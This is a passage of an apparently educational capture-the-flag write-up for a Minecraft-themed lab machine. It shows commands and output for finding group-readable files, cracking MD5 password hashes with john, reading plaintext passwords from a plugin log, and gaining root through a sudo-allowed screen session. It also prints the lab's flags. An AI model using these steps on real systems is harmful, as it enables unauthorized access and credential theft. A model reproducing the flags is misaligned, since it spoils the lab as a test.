xxultimatecreeperxx@cybercrafted:~$ whoami
xxultimatecreeperxx
xxultimatecreeperxx@cybercrafted:~$ export TERM=xterm
xxultimatecreeperxx@cybercrafted:~$ 
```

## Minecraft server flag 

To get the **Minecraft server flag** we can use `find`

```bash
xxultimatecreeperxx@cybercrafted:/$ find / -name "minecraft_server_flag.txt" 2>/dev/null
/opt/minecraft/minecraft_server_flag.txt
xxultimatecreeperxx@cybercrafted:/$ ls -l /opt/minecraft/minecraft_server_flag.txt
-rw-r----- 1 cybercrafted minecraft 38 Jun 27  2021 /opt/minecraft/minecraft_server_flag.txt
xxultimatecreeperxx@cybercrafted:/$ cat /opt/minecraft/minecraft_server_flag.txt
THM{ba93767ae3db9f5b8399680040a0c99e}
xxultimatecreeperxx@cybercrafted:/$ 
```

## Shell as cybercrafted 

Our user is a part of the minecraft group 

```bash
xxultimatecreeperxx@cybercrafted:/$ id
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
xxultimatecreeperxx@cybercrafted:/$ 
```

We see what files this group can view

```bash
xxultimatecreeperxx@cybercrafted:/$ find / -type f -group minecraft 2>/dev/null
/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/commands.yml
/opt/minecraft/cybercrafted/world/level.dat_mcr
/opt/minecraft/cybercrafted/world/session.lock
/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/playerdata/77f6b2f8-e83c-458d-9795-6487671ad59f.dat
/opt/minecraft/cybercrafted/world/DIM1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/data/villages_nether.dat
/opt/minecraft/cybercrafted/world/data/villages.dat
/opt/minecraft/cybercrafted/world/data/villages_end.dat
/opt/minecraft/cybercrafted/world/data/Fortress.dat
/opt/minecraft/cybercrafted/world/forcedchunks.dat
/opt/minecraft/cybercrafted/world/uid.dat
/opt/minecraft/cybercrafted/world/stats/_madrins.json
/opt/minecraft/cybercrafted/world/stats/hank20000.json
/opt/minecraft/cybercrafted/world/stats/77f6b2f8-e83c-458d-9795-6487671ad59f.json
/opt/minecraft/cybercrafted/world/players/hank20000.dat
/opt/minecraft/cybercrafted/world/players/_madrins.dat
/opt/minecraft/cybercrafted/world/region/r.-2.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-1.mca
/opt/minecraft/cybercrafted/world/region/r.0.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.0.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-2.mca
/opt/minecraft/cybercrafted/world/region/r.0.-1.mca
/opt/minecraft/cybercrafted/permissions.yml
/opt/minecraft/cybercrafted/server-icon.png
/opt/minecraft/cybercrafted/world_the_end/session.lock
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_the_end/uid.dat
/opt/minecraft/cybercrafted/white-list.txt
/opt/minecraft/cybercrafted/craftbukkit-1.7.2-server.jar
/opt/minecraft/cybercrafted/world_nether/session.lock
/opt/minecraft/cybercrafted/world_nether/level.dat_old
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_nether/level.dat
/opt/minecraft/cybercrafted/world_nether/uid.dat
/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar
/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml
/opt/minecraft/cybercrafted/logs/2021-06-28-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-5.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-4.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-28-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-1.log.gz
/opt/minecraft/cybercrafted/server.properties
/opt/minecraft/cybercrafted/ops.txt
/opt/minecraft/cybercrafted/bukkit.yml
/opt/minecraft/cybercrafted/banned-ips.txt
/opt/minecraft/cybercrafted/banned-players.txt
xxultimatecreeperxx@cybercrafted:/$ 
```

We found a `note.txt`

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
WorldBackup  cybercrafted  minecraft_server_flag.txt  note.txt
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ 
```

Ok we have more information because say **a new plugin** and a new route **cybercrafted** so if we go inside we see configuration files

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd cybercrafted/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ ls
banned-ips.txt      commands.yml                  logs             plugins            white-list.txt  world_the_end
banned-players.txt  craftbukkit-1.7.2-server.jar  ops.txt          server-icon.png    world
bukkit.yml          help.yml                      permissions.yml  server.properties  world_nether
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ 
```

We found some **hashes**

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cd plugins/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls -la
total 56
drwxr-x--- 3 cybercrafted minecraft  4096 Jun 27  2021 .
drwxr-x--- 7 cybercrafted minecraft  4096 Jun 27  2021 ..
drwxr-x--- 2 cybercrafted minecraft  4096 Oct  6  2021 LoginSystem
-rwxr-x--- 1 cybercrafted minecraft 43514 Jun 27  2021 LoginSystem_v.2.4.jar
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd LoginSystem/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
language.yml  log.txt  passwords.yml  settings.yml
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$
```

We have the credentials of an uninteresting user 

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (madrinch)
1g 0:00:00:01 DONE (2023-07-15 21:14) 0.8064g/s 11567Kp/s 11567Kc/s 11594KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

But if we see the `log.txt` we found the password of cybercrafted `JavaEdition>Bedrock`

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt 

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123


[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!
[2023/07/16 01:53:12] [BUKKIT-SERVER] Startet LoginSystem!xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
Password: 
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$
```

## User txt 

```bash
cybercrafted@cybercrafted:~$ ls
user.txt
cybercrafted@cybercrafted:~$ cat user.txt 
THM{b4aa20aaf08f174473ab0325b24a45ca}
cybercrafted@cybercrafted:~$ 
```

## Privilege Escalation && root.txt 

We can view what sudo privileges the user can perform

```bash
cybercrafted@cybercrafted:~$ sudo -l
[sudo] password for cybercrafted: 
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
cybercrafted@cybercrafted:~$ 
```

This command allows the user to join a screen session with the name **cybercrafted**, let's connect to the session as the root user <https://linuxize.com/post/how-to-use-linux-screen/>

```bash
sudo /usr/bin/screen -r cybercrafted
```

![](/assets/images/try-writeup-cybercraft/xd.png)

Now we use the **shortcut** `CTRL+A+C`

```bash
# whoami
root
# ls    
root.txt
# cat root.txt
THM{8bb1eda065ceefb5795a245568350a70}
# 
```

## Task 2 Root it 

![](/assets/images/try-writeup-cybercraft/vale.png)





